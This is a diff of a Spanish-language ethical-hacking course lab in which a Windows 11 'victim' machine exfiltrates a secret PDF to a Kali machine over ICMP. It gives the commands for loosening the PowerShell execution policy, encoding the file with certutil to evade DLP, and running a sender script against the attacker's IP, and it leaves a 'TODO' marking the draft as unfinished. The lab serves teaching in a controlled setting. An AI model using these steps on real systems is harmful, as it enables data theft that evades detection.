@@ -19,6 +19,14 @@ La ejecución de scripts maliciosos de PowerShell viene siendo bien detectada po
 
 Asegúrate que en la máquina ***Win 11*** tienes clonado el repo de Github con los archivos del curso. Si no es así o no lo tienes claro, mira el ***Ejercicio 11: Clonado del repositorio de GitHub.*** del ***lab-00.md***.
 
+También debemos asegurarnos de que se permite la ejecución de scripts de ***PowerShell***. Abrimos una terminal de ***PowerShell*** como ***ADMINISTRADOR***. En ellas ejecutamos.
+```
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
+```
+
+Cerramos la terminal de administrador de ***PowerShell***.
+
+
 En este escenario, el equipo ***Víctima*** (***Win 11***) está bajo el control del actor de la amenaza. En este mismo equipo también se encuentra el documento secreto que se desea exfiltrar.
 
 Para conseguirlo vamos a enviar el archivo desde el equipo de la víctima al equipo de ataque (***Kali***) usando el protocolo ***ICMP***.
@@ -50,7 +58,45 @@ Ejecutamos el servidor ***ICMP***. En la terminal escribimos.
 sudo python ~/eHacking_LABS/50/icmp_server.py
 ```
 
+## Ejercicio 3: Codificar el documento secreto.
 
+Para ponérselo más difícil al sistema ***DPM*** vamos a codificar el documento en la máquina víctima (recordemos que el actor de la amenaza tiene su control). Para ello usaremos la herramienta ***CertUtil***.
+
+En la máquina de ***Win 11***, en la terminal de ***PowerShell*** escribimos.
+```
+cd C:\Users\antonio\eHacking_LABS\50
+
+certutil -encode TopSecret.pdf TopSecret.txt
+```
+
+Podemos ver el documento codificado.
+Nota: ***CTRL+C*** cuando te aburras.
+```
+cat TopSecret.txt
+```
+
+Visualizamos el script de ***PowerShell*** que va a enviar el archivo.
+```
+code ICMPSender.ps1
+```
+
+Las líneas más importantes son:
+* *18:* IP de la máquina de ***Kali*** que está ejecutando el servidor ***ICMP***.
+* *26:* Archivo a exfiltrar codificado con ***CertUtil***.
+
+El código trocea el archivo en bloques de ***1472*** que es el máximo que puede llevar en la carga los paquetes ***ICMP***.
+
+Cerramos ***Visual Studio Code*** y ejecutamos el script.
+```
+.\ICMPSender.ps1
+```
+
+
+
+
+
+
+TODO. PARA EL FINAL!!!!
 
 En la máquina ***Kali*** volvemos a habilitar la respuesta de ***ICMP***.
 ```
